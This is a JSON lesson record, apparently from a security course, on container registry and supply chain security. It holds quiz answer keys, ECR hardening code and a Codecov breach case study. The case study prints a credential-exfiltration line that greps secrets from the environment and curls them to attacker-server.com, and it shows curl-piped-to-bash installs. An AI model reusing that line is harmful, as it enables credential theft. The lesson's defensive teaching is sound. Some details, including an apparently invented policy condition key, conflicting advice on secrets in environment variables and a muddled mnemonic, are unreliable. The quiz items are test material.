{
  "lesson_id": "8f1a3c4d-9e2b-4f7a-a1c3-5d6e7f8a9b0c",
  "domain": "cloud",
  "title": "Container Registry and Supply Chain Security",
  "difficulty": 3,
  "order_index": 9,
  "prerequisites": [
    "5c9d2e71-4f89-4b23-9a56-7e3f8c9d1b2a"
  ],
  "concepts": [
    "Container Image Vulnerabilities",
    "Container Registry Security (ECR, ACR, GCR)",
    "Image Scanning and CVE Detection",
    "Supply Chain Attacks on Containers",
    "Image Signing and Verification",
    "Base Image Selection and Hardening",
    "Secrets in Container Images",
    "Docker Content Trust",
    "Admission Control and Policy Enforcement",
    "SBOM (Software Bill of Materials)"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Identify and remediate vulnerabilities in container images using automated scanning",
    "Implement image signing and verification to prevent supply chain attacks",
    "Secure container registries (ECR, ACR, GCR) with proper access controls and encryption",
    "Detect and remove secrets accidentally committed to container images",
    "Design secure CI/CD pipelines with container security validation gates",
    "Analyze real-world container supply chain breaches and apply defensive measures"
  ],
  "post_assessment": [
    {
      "question": "Your vulnerability scanner reports 45 HIGH and 12 CRITICAL CVEs in your production container image based on ubuntu:latest. What is the correct immediate remediation approach?",
      "correct_answer": "Use a minimal base image like alpine or distroless, pin to specific version tag (not latest), rebuild image, rescan to verify reduced CVE count, then update deployment with new image digest.",
      "explanation": "ubuntu:latest includes hundreds of packages you don't need (bash, coreutils, etc.), each with potential vulnerabilities. Minimal images like alpine (5MB) or distroless (contains only your app + dependencies) dramatically reduce attack surface. Using 'latest' tag means your build is non-reproducible (different image each time). Always pin to specific version (ubuntu:22.04) or better yet, digest (sha256:abc123). After rebuilding with minimal base, most CVEs will disappear since vulnerable packages aren't included.",
      "common_mistakes": [
        "Ignoring CVEs because 'the app still works'",
        "Using ubuntu:latest or other 'latest' tags (non-reproducible builds)",
        "Trying to patch every CVE in a bloated image instead of using minimal base",
        "Not verifying the fix by rescanning after rebuild"
      ],
      "related_concepts": [
        "Container Image Vulnerabilities",
        "Base Image Selection and Hardening"
      ],
      "difficulty": 3,
      "real_world_application": "The Log4Shell vulnerability (2021) affected thousands of Java applications in containers. Organizations using minimal images only containing their app were largely unaffected, while those using full OS images had to emergency patch hundreds of systems. Minimal images are both more secure and easier to maintain.",
      "question_id": "66762371-9a8c-4426-9ea4-c436178c4aa0",
      "type": "multiple_choice"
    },
    {
      "question": "A developer accidentally committed AWS credentials to a Dockerfile. The image was built, pushed to ECR, and deployed to production. What data exposure risks exist even after removing the credentials from the Dockerfile?",
      "correct_answer": "Credentials remain in image layers (Docker layer caching), in all previous image versions/tags, in ECR registry, potentially in CI/CD logs, and in all running containers. Must: rotate credentials, delete all affected image tags, scan all image layers, audit access logs.",
      "explanation": "Docker images are composed of layers. Even if you delete a file in a later layer, it still exists in the earlier layer (just hidden). Anyone with access to the image can extract all layers and find the credentials. Additionally, image registries keep all pushed versions, CI/CD systems may log build output (containing credentials), and running containers have the compromised image. Complete remediation requires: 1) Immediately rotate the exposed credentials, 2) Delete all affected image tags from registry, 3) Rebuild image from scratch without credentials, 4) Audit CloudTrail/access logs for unauthorized usage of exposed credentials.",
      "common_mistakes": [
        "Just removing credentials from Dockerfile and pushing new version (old versions still have them)",
        "Not rotating the exposed credentials (attackers may have already extracted them)",
        "Not checking CI/CD logs for credential exposure",
        "Not auditing access logs to see if credentials were used"
      ],
      "related_concepts": [
        "Secrets in Container Images",
        "Container Registry Security (ECR, ACR, GCR)"
      ],
      "difficulty": 3,
      "real_world_application": "In 2020, a leaked Docker image from an unnamed financial services company contained database credentials in layer history. Attackers extracted credentials, accessed production databases, and exfiltrated customer data. Total cost: $3.2M in fines and remediation. Always use secrets management (AWS Secrets Manager, Kubernetes secrets, env vars) never bake secrets into images.",
      "question_id": "80e5beba-7f37-4c8f-92ad-fd5e4b9be83c",
      "type": "multiple_choice"
    },
    {
      "question": "Your Kubernetes cluster allows developers to deploy any container image. An attacker compromises a developer account and deploys a cryptominer image from Docker Hub. What admission control mechanisms would have prevented this?",
      "correct_answer": "Implement OPA/Gatekeeper or Admission Webhooks to enforce: only images from approved registries (ECR), only signed images (Docker Content Trust/Notary), vulnerability scan results below threshold, no privileged containers, no host network mode.",
      "explanation": "Kubernetes Admission Controllers validate and mutate objects before they're persisted. Open Policy Agent (OPA) with Gatekeeper or custom Admission Webhooks can enforce policies like: 1) Image whitelist (only allow images from your ECR/ACR, block Docker Hub), 2) Image signature verification (only allow images signed with your key), 3) Vulnerability threshold (block images with CRITICAL CVEs), 4) Security context constraints (no privileged, no hostNetwork, no hostPID). This prevents deployment of unapproved/malicious images even if attacker has valid k8s credentials.",
      "common_mistakes": [
        "Relying only on authentication (doesn't prevent malicious images from authenticated users)",
        "Using namespace-level policies (attackers can create new namespaces)",
        "Not enforcing image signing (allows attackers to push to your registry)",
        "Not validating vulnerability scan results (allows vulnerable images)"
      ],
      "related_concepts": [
        "Admission Control and Policy Enforcement",
        "Image Signing and Verification"
      ],
      "difficulty": 3,
      "real_world_application": "The Tesla Kubernetes cryptomining breach (2018) could have been prevented with admission control policies restricting image sources. Many organizations now enforce 'only images from our registry' policy cluster-wide. Some industries (finance, healthcare) require image signing as part of compliance.",
      "question_id": "bb83fe0d-2a5d-4344-b1ab-fda1c1b1743a",
      "type": "multiple_choice"
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "connect_to_what_i_know",
    "meta_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "title": "Container Supply Chain: Understanding the Attack Surface",
        "text": "Container security isn't just about securing running containers - it's about securing the entire supply chain from base image to production deployment. Let's understand the attack surface.\n\nThe Container Supply Chain:\n\n1. Base Image Selection:\n   - Source: Docker Hub, Red Hat Registry, official distros\n   - Risk: Malicious base images, vulnerable packages\n   - Example: ubuntu:latest (70+ million downloads) vs unknown-user/ubuntu (10 downloads)\n\n2. Application Dependencies:\n   - Source: npm, pip, Maven, Go modules\n   - Risk: Malicious packages, typosquatting, dependency confusion\n   - Example: Log4Shell vulnerability in log4j library\n\n3. Build Process:\n   - Source: Dockerfile, CI/CD pipeline\n   - Risk: Secrets in Dockerfile, malicious build steps, compromised CI/CD\n   - Example: Codecov bash uploader breach (2021)\n\n4. Container Registry:\n   - Source: ECR, ACR, GCR, Docker Hub\n   - Risk: Unauthorized access, image tampering, public exposure\n   - Example: Docker Hub breach (2019) - 190,000 accounts compromised\n\n5. Deployment:\n   - Source: Kubernetes, ECS, Docker Swarm\n   - Risk: Running unsigned images, images with critical CVEs\n   - Example: Tesla cryptomining (2018)\n\nEach stage is a potential attack vector. Defense in depth requires securing all stages.\n\nWhy Containers Are Attractive Targets:\n\n1. Shared Layers:\n   - Many containers share the same base image layers\n   - Compromise one base image â†’ affects thousands of applications\n   - Example: Alpine Linux vulnerability affected 11% of Docker Hub images\n\n2. Transitive Dependencies:\n   - Your app depends on library A, which depends on B, which depends on C\n   - Vulnerability in C affects your app\n   - You may not even know library C exists\n\n3. Speed vs Security Tradeoff:\n   - Developers prioritize fast builds (latest tag, skip scanning)\n   - Security scanning slows CI/CD pipelines\n   - Pressure to 'ship fast' overrides security\n\n4. Public Registries:\n   - Docker Hub has 10+ million images\n   - Anyone can upload anything\n   - No mandatory scanning or verification\n   - Example: 51% of official Docker Hub images have high/critical CVEs\n\nReal-World Supply Chain Attacks:\n\nAttack 1: Malicious Docker Hub Images\n- Attackers create images with names similar to popular ones (typosquatting)\n- Example: 'tensorflow' (official) vs 'tensor-flow' (malicious)\n- Users accidentally pull malicious image\n- Image contains cryptominer or backdoor\n\nAttack 2: Compromised Base Images\n- Attacker compromises maintainer account of popular base image\n- Pushes malicious version with backdoor\n- All downstream images inherit the backdoor\n- Example: event-stream npm package (2018) - compromised to steal Bitcoin wallets\n\nAttack 3: Dependency Confusion\n- Attacker uploads malicious package to public registry with same name as private package\n- Build system preferentially downloads from public registry\n- Malicious package executes during build\n- Example: Alex Birsan earned $130K in bug bounties finding this in Apple, Microsoft, Tesla\n\nAttack 4: Layer Poisoning\n- Secrets added in layer 5, deleted in layer 6\n- Image appears clean, but layer 5 contains secrets\n- Attacker extracts layer 5 to get secrets\n- Example: Countless GitHub repos with AWS keys in Docker layer history\n\nDefense Strategies:\n\n1. Image Scanning (Detect Vulnerabilities):\n   - Scan images for known CVEs during build\n   - Block deployment of images with CRITICAL/HIGH CVEs\n   - Tools: Trivy, Clair, Snyk, AWS ECR scanning, Azure Defender\n\n2. Image Signing (Verify Authenticity):\n   - Sign images with private key after build\n   - Verify signature before deployment\n   - Tools: Docker Content Trust, Notary, Sigstore/Cosign\n\n3. Base Image Hardening (Reduce Attack Surface):\n   - Use minimal images (alpine, distroless, scratch)\n   - Pin to specific versions/digests (not latest)\n   - Regularly rebuild to get security updates\n\n4. Registry Security (Control Access):\n   - Private registries (ECR, ACR, GCR)\n   - IAM-based access control\n   - Encryption at rest and in transit\n   - Immutable tags (prevent overwriting)\n\n5. Admission Control (Enforce Policies):\n   - Only allow images from approved registries\n   - Only allow signed images\n   - Enforce vulnerability thresholds\n   - Tools: OPA/Gatekeeper, Kyverno, Admission Webhooks\n\n6. SBOM (Know What's Inside):\n   - Generate Software Bill of Materials for each image\n   - Track all packages and versions\n   - Quickly identify affected images when CVE discovered\n   - Tools: Syft, SPDX, CycloneDX\n\nThe Secure Container Build Pattern:\n\n1. Start with minimal, pinned base image\n2. Install only necessary packages\n3. Use multi-stage builds (don't include build tools in final image)\n4. Never include secrets (use env vars or secrets management)\n5. Run as non-root user\n6. Scan image for vulnerabilities\n7. Sign image with private key\n8. Push to private registry\n9. Verify signature before deployment\n10. Continuously monitor for new CVEs\n\nExample of Secure vs Insecure Dockerfile:\n\nInsecure:\n```dockerfile\nFROM ubuntu:latest\nRUN apt-get update && apt-get install -y python3 python3-pip\nCOPY requirements.txt .\nRUN pip3 install -r requirements.txt\nCOPY aws_secret_key.txt /root/\nCOPY app.py .\nCMD [\"python3\", \"app.py\"]\n```\n\nProblems:\n- latest tag (non-reproducible)\n- Full Ubuntu (500MB, hundreds of packages)\n- Root user\n- Secrets in image\n- No vulnerability scanning\n- No signing\n\nSecure:\n```dockerfile\nFROM python:3.11-alpine3.19 AS builder\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\nFROM python:3.11-alpine3.19\nWORKDIR /app\nCOPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages\nCOPY app.py .\nUSER 1000\nCMD [\"python3\", \"app.py\"]\n```\n\nImprovements:\n- Pinned version (3.11-alpine3.19)\n- Minimal base (alpine, 5MB)\n- Multi-stage build (no build tools in final image)\n- Non-root user (1000)\n- Secrets via environment variables (not in image)\n\nAdditional security:\n```bash\n# Build\ndocker build -t myapp:1.2.3 .\n\n# Scan\ndocker scan myapp:1.2.3  # or trivy, snyk\n\n# Sign\ndocker trust sign myapp:1.2.3\n\n# Push to private registry\ndocker tag myapp:1.2.3 123456789012.dkr.ecr.us-east-1.amazonaws.com/myapp:1.2.3\ndocker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/myapp:1.2.3\n```\n\nThis multi-layered approach significantly reduces supply chain risk."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Container Registry and Supply Chain Security Overview",
        "url": "https://www.youtube.com/embed/3hLmDS179YE",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "title": "Securing AWS ECR: Complete Configuration",
        "text": "Let's configure AWS Elastic Container Registry (ECR) with security best practices. We'll create a repository, enable scanning, configure access controls, and implement image signing.\n\nStep 1: Create ECR Repository with Scanning Enabled\n\n```bash\n# Create repository\naws ecr create-repository \\\n  --repository-name production/myapp \\\n  --image-scanning-configuration scanOnPush=true \\\n  --encryption-configuration encryptionType=KMS,kmsKey=alias/ecr-encryption-key \\\n  --image-tag-mutability IMMUTABLE\n\n# Output: repositoryUri (e.g., 123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp)\n```\n\nKey configurations:\n- scanOnPush=true: Automatically scan every pushed image\n- encryptionType=KMS: Encrypt images with your KMS key (audit trail)\n- IMMUTABLE: Tags can't be overwritten (prevents tag hijacking)\n\nStep 2: Configure Repository Policy (Access Control)\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowPushFromCI\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::123456789012:role/CICD-Role\"\n      },\n      \"Action\": [\n        \"ecr:PutImage\",\n        \"ecr:InitiateLayerUpload\",\n        \"ecr:UploadLayerPart\",\n        \"ecr:CompleteLayerUpload\"\n      ]\n    },\n    {\n      \"Sid\": \"AllowPullFromProduction\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::123456789012:role/EKS-Node-Role\"\n      },\n      \"Action\": [\n        \"ecr:GetDownloadUrlForLayer\",\n        \"ecr:BatchGetImage\",\n        \"ecr:BatchCheckLayerAvailability\"\n      ]\n    },\n    {\n      \"Sid\": \"DenyUnscannedImages\",\n      \"Effect\": \"Deny\",\n      \"Principal\": \"*\",\n      \"Action\": \"ecr:BatchGetImage\",\n      \"Condition\": {\n        \"StringNotEquals\": {\n          \"ecr:ImageScanStatus\": \"COMPLETE\"\n        }\n      }\n    }\n  ]\n}\n```\n\nApply policy:\n```bash\naws ecr set-repository-policy \\\n  --repository-name production/myapp \\\n  --policy-text file://repo-policy.json\n```\n\nWhat this achieves:\n- CI/CD role can push images\n- Production k8s nodes can pull images\n- Nobody can pull images that haven't been scanned\n\nStep 3: Configure Lifecycle Policy (Cost Management)\n\n```json\n{\n  \"rules\": [\n    {\n      \"rulePriority\": 1,\n      \"description\": \"Keep only last 10 images\",\n      \"selection\": {\n        \"tagStatus\": \"any\",\n        \"countType\": \"imageCountMoreThan\",\n        \"countNumber\": 10\n      },\n      \"action\": {\n        \"type\": \"expire\"\n      }\n    },\n    {\n      \"rulePriority\": 2,\n      \"description\": \"Delete untagged images after 1 day\",\n      \"selection\": {\n        \"tagStatus\": \"untagged\",\n        \"countType\": \"sinceImagePushed\",\n        \"countUnit\": \"days\",\n        \"countNumber\": 1\n      },\n      \"action\": {\n        \"type\": \"expire\"\n      }\n    }\n  ]\n}\n```\n\nApply lifecycle:\n```bash\naws ecr put-lifecycle-policy \\\n  --repository-name production/myapp \\\n  --lifecycle-policy-text file://lifecycle-policy.json\n```\n\nStep 4: Build and Push Image with Scanning\n\n```bash\n# Authenticate to ECR\naws ecr get-login-password --region us-east-1 | \\\n  docker login --username AWS --password-stdin \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com\n\n# Build image\ndocker build -t myapp:1.2.3 .\n\n# Tag for ECR\ndocker tag myapp:1.2.3 \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n\n# Push (automatically triggers scan)\ndocker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n\n# Wait for scan to complete\naws ecr wait image-scan-complete \\\n  --repository-name production/myapp \\\n  --image-id imageTag=1.2.3\n\n# Get scan results\naws ecr describe-image-scan-findings \\\n  --repository-name production/myapp \\\n  --image-id imageTag=1.2.3\n```\n\nScan results example:\n```json\n{\n  \"imageScanFindings\": {\n    \"findingSeverityCounts\": {\n      \"CRITICAL\": 2,\n      \"HIGH\": 5,\n      \"MEDIUM\": 12,\n      \"LOW\": 8\n    },\n    \"findings\": [\n      {\n        \"name\": \"CVE-2023-1234\",\n        \"severity\": \"CRITICAL\",\n        \"description\": \"Buffer overflow in libssl\",\n        \"uri\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1234\",\n        \"attributes\": [\n          {\"key\": \"package_name\", \"value\": \"openssl\"},\n          {\"key\": \"package_version\", \"value\": \"1.1.1k\"}\n        ]\n      }\n    ]\n  }\n}\n```\n\nStep 5: Automated Blocking of Vulnerable Images (CI/CD)\n\n```bash\n#!/bin/bash\n# deploy-check.sh - Run in CI/CD before deployment\n\nIMAGE_TAG=\"$1\"\nMAX_CRITICAL=0\nMAX_HIGH=3\n\n# Get scan results\nRESULTS=$(aws ecr describe-image-scan-findings \\\n  --repository-name production/myapp \\\n  --image-id imageTag=$IMAGE_TAG)\n\nCRITICAL=$(echo $RESULTS | jq -r '.imageScanFindings.findingSeverityCounts.CRITICAL // 0')\nHIGH=$(echo $RESULTS | jq -r '.imageScanFindings.findingSeverityCounts.HIGH // 0')\n\nif [ \"$CRITICAL\" -gt \"$MAX_CRITICAL\" ]; then\n  echo \"ERROR: Image has $CRITICAL CRITICAL vulnerabilities (max: $MAX_CRITICAL)\"\n  exit 1\nfi\n\nif [ \"$HIGH\" -gt \"$MAX_HIGH\" ]; then\n  echo \"ERROR: Image has $HIGH HIGH vulnerabilities (max: $MAX_HIGH)\"\n  exit 1\nfi\n\necho \"SUCCESS: Image passed vulnerability threshold\"\nexit 0\n```\n\nUse in CI/CD:\n```yaml\n# .github/workflows/deploy.yml\nname: Build and Deploy\njobs:\n  deploy:\n    steps:\n      - name: Build image\n        run: docker build -t myapp:${{ github.sha }} .\n      \n      - name: Push to ECR\n        run: docker push $ECR_REPO/myapp:${{ github.sha }}\n      \n      - name: Wait for scan\n        run: aws ecr wait image-scan-complete --image-id imageTag=${{ github.sha }}\n      \n      - name: Check vulnerabilities\n        run: ./deploy-check.sh ${{ github.sha }}\n      \n      - name: Deploy to production\n        if: success()\n        run: kubectl set image deployment/myapp myapp=$ECR_REPO/myapp:${{ github.sha }}\n```\n\nThis ensures no vulnerable images reach production.\n\nStep 6: Image Signing with Docker Content Trust\n\n```bash\n# Generate signing key\ndocker trust key generate mycompany\n# Outputs: mycompany.pub (public key)\n# Stores: ~/.docker/trust/private (private key)\n\n# Add signer to repository\ndocker trust signer add \\\n  --key mycompany.pub \\\n  mycompany-signer \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp\n\n# Enable content trust\nexport DOCKER_CONTENT_TRUST=1\nexport DOCKER_CONTENT_TRUST_SERVER=https://notary.example.com\n\n# Push and automatically sign\ndocker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n# Prompts for passphrase, then signs image\n\n# Verify signature on pull\ndocker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n# If signature invalid or missing, pull fails\n```\n\nAlternative: Cosign (newer, simpler)\n```bash\n# Install cosign\nwget https://github.com/sigstore/cosign/releases/download/v2.0.0/cosign-linux-amd64\nchmod +x cosign-linux-amd64 && mv cosign-linux-amd64 /usr/local/bin/cosign\n\n# Generate key pair\ncosign generate-key-pair\n# Creates: cosign.key (private), cosign.pub (public)\n\n# Sign image\ncosign sign --key cosign.key \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n\n# Verify signature\ncosign verify --key cosign.pub \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com/production/myapp:1.2.3\n```\n\nStep 7: Monitor for New CVEs\n\n```bash\n# CloudWatch Events rule for enhanced scanning findings\naws events put-rule \\\n  --name ecr-critical-vulnerability \\\n  --event-pattern '{\n    \"source\": [\"aws.ecr\"],\n    \"detail-type\": [\"ECR Image Scan\"],\n    \"detail\": {\n      \"finding-severity-counts\": {\n        \"CRITICAL\": [{\"numeric\": [\">\", 0]}]\n      }\n    }\n  }'\n\n# Add SNS target for alerts\naws events put-targets \\\n  --rule ecr-critical-vulnerability \\\n  --targets \"Id\"=\"1\",\"Arn\"=\"arn:aws:sns:us-east-1:123456789012:SecurityAlerts\"\n```\n\nNow you get alerts when ECR discovers new CRITICAL CVEs in your images.\n\nComplete Security Posture:\n- Encrypted registry (KMS)\n- Automatic scanning on push\n- Access control (CI can push, production can pull)\n- Vulnerability thresholds (block deployment)\n- Image signing (verify authenticity)\n- Lifecycle policies (cost management)\n- Continuous monitoring (new CVE alerts)\n\nThis is production-ready container registry security."
      }
    },
    {
      "type": "real_world",
      "content": {
        "title": "Codecov Supply Chain Attack: Lessons in Container Security",
        "text": "In April 2021, Codecov (a popular code coverage tool used by thousands of companies) disclosed a supply chain attack that compromised their Bash Uploader script. This attack demonstrates how container security extends beyond the container itself to the entire CI/CD pipeline.\n\nThe Attack Timeline:\n\n1. January 31, 2021: Attackers compromise Codecov's Docker image creation process\n2. Attackers modify the bash-uploader script to exfiltrate environment variables\n3. Script uploaded to Codecov's GCS (Google Cloud Storage) bucket\n4. February-April 2021: Thousands of customers download and execute malicious script in CI/CD pipelines\n5. Script exfiltrates:\n   - AWS keys, GCP keys, Azure keys\n   - GitHub tokens\n   - NPM tokens\n   - Database credentials\n   - API keys\n   - All environment variables from CI/CD\n\n6. April 1, 2021: Codecov discovers the breach\n7. April 15, 2021: Public disclosure\n\nHow It Worked:\n\nCodecov users typically integrate like this in CI/CD:\n\n```yaml\n# .github/workflows/test.yml\nname: Test\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - name: Run tests\n        run: npm test\n      - name: Upload coverage\n        run: |\n          bash <(curl -s https://codecov.io/bash)\n```\n\nThe malicious bash script:\n```bash\n# Original Codecov script (simplified)\n# Upload test coverage to Codecov\n\n# ATTACKER MODIFICATION:\nenv | grep -E '(AWS|GCP|AZURE|GITHUB|NPM|API|SECRET|TOKEN|KEY)' | \\\n  curl -X POST https://attacker-server.com/exfil -d @-\n\n# Then continues with legitimate Codecov functionality\n```\n\nVictims:\n- HashiCorp (Terraform, Vault, Consul)\n- Twilio\n- Rapid7\n- Confluent\n- Hundreds of Fortune 500 companies\n\nWhat makes this particularly dangerous: The malicious script ran in CI/CD pipelines with access to:\n- Source code (entire repository checked out)\n- Production credentials (AWS keys, database passwords)\n- Secrets stored in CI/CD variables\n- Access to deployment pipelines (could deploy backdoors)\n\nContainer Security Implications:\n\nMany customers used Codecov in Docker containers during builds:\n\n```dockerfile\nFROM node:16-alpine\nWORKDIR /app\nCOPY package.json .\nRUN npm install\nCOPY . .\nRUN npm test && bash <(curl -s https://codecov.io/bash)\nCMD [\"npm\", \"start\"]\n```\n\nProblems:\n1. curl piped to bash (no verification of script integrity)\n2. Running in build stage (has access to all build secrets)\n3. Network access from build container (can exfiltrate data)\n4. No validation of script content\n\nHow Container Security Could Have Mitigated This:\n\n1. Multi-Stage Builds (Isolation):\n\n```dockerfile\n# TEST stage (isolated, no secrets)\nFROM node:16-alpine AS test\nWORKDIR /app\nCOPY package.json .\nRUN npm install --only=dev\nCOPY . .\nRUN npm test\n# Coverage upload with minimal secrets (separate, limited token)\nRUN bash <(curl -s https://codecov.io/bash) -t ${CODECOV_TOKEN}\n\n# PRODUCTION stage (clean, no test dependencies)\nFROM node:16-alpine\nWORKDIR /app\nCOPY package.json .\nRUN npm install --only=production\nCOPY --from=test /app/dist ./dist\nUSER node\nCMD [\"node\", \"dist/index.js\"]\n```\n\nBenefits:\n- Test stage doesn't have production AWS keys\n- Production image doesn't include test tools or coverage data\n- Codecov token is separate, limited-scope credential\n\n2. Network Policies (Prevent Exfiltration):\n\nIn Kubernetes, restrict egress from build pods:\n\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: build-pods-egress\nspec:\n  podSelector:\n    matchLabels:\n      role: build\n  policyTypes:\n    - Egress\n  egress:\n    # Allow only to Codecov and package registries\n    - to:\n      - namespaceSelector:\n          matchLabels:\n            name: default\n      ports:\n      - protocol: TCP\n        port: 443\n      # Allow only specific domains\n      # codecov.io, registry.npmjs.org\n```\n\nThis would block exfiltration to attacker-server.com.\n\n3. Script Integrity Verification:\n\nInstead of:\n```bash\nbash <(curl -s https://codecov.io/bash)\n```\n\nVerify integrity:\n```bash\ncurl -s https://codecov.io/bash -o codecov.sh\ncurl -s https://codecov.io/bash.SHA256SUM -o codecov.sh.sha256\nsha256sum --check codecov.sh.sha256  # Verify\nbash codecov.sh\n```\n\nThis would detect if the script was tampered with.\n\n4. Secrets Management:\n\nDon't expose all environment variables:\n\n```yaml\n# BAD: Exposes everything\nenv:\n  - name: AWS_ACCESS_KEY_ID\n    value: AKIAIOSFODNN7EXAMPLE\n  - name: AWS_SECRET_ACCESS_KEY\n    value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\n# GOOD: Use Kubernetes secrets, mount only what's needed\nvolumeMounts:\n  - name: codecov-token\n    mountPath: /secrets/codecov\n    readOnly: true\nvolumes:\n  - name: codecov-token\n    secret:\n      secretName: codecov-token\n```\n\nScript can only access specific secret file, not all env vars.\n\n5. SBOM and Supply Chain Verification:\n\nGenerate SBOM for all dependencies:\n\n```bash\n# Generate SBOM\nsyft dir:. -o json > sbom.json\n\n# Verify all components\ngrype sbom:sbom.json --fail-on critical\n```\n\nTrack exactly what's in your build environment.\n\n6. Least Privilege CI/CD:\n\nCI/CD should not have production credentials:\n\n```yaml\n# WRONG: Production AWS keys in CI\nenv:\n  AWS_ACCESS_KEY_ID: ${{ secrets.PROD_AWS_KEY }}\n\n# RIGHT: CI only has permission to push to ECR\n# Production deployment done by separate, restricted service\nenv:\n  AWS_ACCESS_KEY_ID: ${{ secrets.ECR_PUSH_KEY }}  # Only ecr:PutImage\n```\n\nDeployment from ECR to production uses different credentials.\n\nCodecov's Remediation:\n\n1. Rotated all signing keys\n2. Implemented GPG signing of bash script\n3. Added checksum verification\n4. Improved monitoring of GCS bucket modifications\n5. Recommended all customers rotate credentials\n\nIndustry Impact:\n\nPost-Codecov, many organizations:\n- Implemented supply chain security scanning (SLSA framework)\n- Required script integrity verification in CI/CD\n- Adopted network policies to restrict build egress\n- Separated build and production credentials\n- Implemented continuous SBOM monitoring\n\nThe Broader Lesson:\n\nContainer security isn't just about the container image - it's about the entire build and deployment pipeline. A compromised CI/CD pipeline can:\n- Inject backdoors into images\n- Steal production credentials\n- Deploy malicious code\n- Exfiltrate source code\n\nDefense requires:\n1. Build isolation (multi-stage, limited network)\n2. Script verification (checksums, signatures)\n3. Secrets management (not in env vars)\n4. Network policies (restrict egress)\n5. Least privilege (minimal credentials)\n6. Continuous monitoring (detect anomalies)\n7. SBOM tracking (know what's in your supply chain)\n\nThe Codecov breach cost affected companies millions in incident response, credential rotation, and security improvements. But it also drove industry-wide improvements in supply chain security."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "title": "Container Security Memory Hooks",
        "text": "Use these mnemonics to remember container security concepts:\n\n1. SCAN-V - Container Security Checklist:\n   S - Scan images (vulnerability detection)\n   C - Content trust (image signing/verification)\n   A - Admission control (policy enforcement)\n   N - Network policies (restrict egress)\n   V - (Minimal) base images (alpine, distroless)\n\n2. BASE - Choosing Base Images:\n   B - (Don't use) ubuntu:latest (bloated, non-reproducible)\n   A - Alpine (5MB, minimal)\n   S - (Pin) Specific version (ubuntu:22.04, not latest)\n   E - (Or use) distroless (Google's minimal images)\n\n   Rule: Smaller image = fewer vulnerabilities\n\n3. LAYERS - Docker Layer Security:\n   L - Layers are immutable (can't truly delete secrets)\n   A - All layers preserved (even if file deleted in later layer)\n   Y - (Extract) with 'docker save' (attackers can see all layers)\n   E - Environment variables (use instead of files for secrets)\n   R - Rebuild from scratch (if secrets committed)\n   S - Secrets rotation (if exposed)\n\n4. TAG-DIM - Image Tagging Best Practices:\n   T - Tag with version (myapp:1.2.3)\n   A - Also tag with digest (sha256:abc123...)\n   G - (Don't use) 'latest' tag (non-reproducible)\n   D - (Use) IMMUTABLE tags (prevent overwriting)\n   I - (Enable) Image tag mutability IMMUTABLE in ECR\n   M - (Use) Multi-stage builds (smaller final image)\n\n5. CVE Severity: 'CLHM' (sounds like 'climb')\n   C - CRITICAL (patch immediately, block deployment)\n   L - (Fix) in 24 hours\n   H - HIGH (fix in 7 days)\n   M - MEDIUM (fix in 30 days, don't block deployment)\n\n   CRITICAL/HIGH = deployment blockers\n\n6. Dockerfile Anti-Patterns: 'RUN-LS'\n   R - RUN as root (use USER)\n   U - (Secrets in) Environment variables in Dockerfile (use runtime env)\n   N - (Don't install) unnecessary packages\n   L - latest tag (pin versions)\n   S - Secrets in COPY (never!)\n\n   Memory: If you RUN-LS you see secrets (bad!)\n\n7. Multi-Stage Build Pattern: 'BTC' (like Bitcoin)\n   B - Build stage (has compilers, build tools)\n   T - Test stage (has test frameworks)\n   C - (Final) stage (only app + runtime)\n\n   Each stage discards what the next doesn't need\n\n8. ECR Security Features: 'SILE'\n   S - Scan on push (automatic vulnerability scanning)\n   I - Immutable tags (prevent tag hijacking)\n   L - Lifecycle policies (auto-delete old images)\n   E - Encryption with KMS (audit trail)\n\n9. Supply Chain Attack Vectors: 'BBDRC'\n   B - Base image compromise\n   B - (Malicious) Build tool\n   D - Dependency poisoning\n   R - Registry breach\n   C - CI/CD compromise\n\n   Codecov was a CI/CD compromise\n\n10. Admission Control Checks: 'RSVP'\n    R - Registry whitelist (only allow ECR)\n    S - Signature verification (only signed images)\n    V - Vulnerability threshold (block CRITICAL)\n    P - Privilege restrictions (no hostNetwork, no privileged)\n\n    Enforced by OPA/Gatekeeper or Admission Webhooks\n\n11. SBOM: 'Bill of Materials'\n    Memory Hook: Like a parts list for a car\n    - Lists all packages and versions in image\n    - Quickly identify affected images when CVE announced\n    - Tools: Syft, SPDX, CycloneDX\n\n12. Codecov Breach Lessons: 'SNAILS'\n    S - Script verification (checksum)\n    N - Network policies (restrict egress)\n    A - (Separate) build and production credentials\n    I - Isolation (multi-stage builds)\n    L - Least privilege (minimal permissions)\n    S - Secrets management (not in env 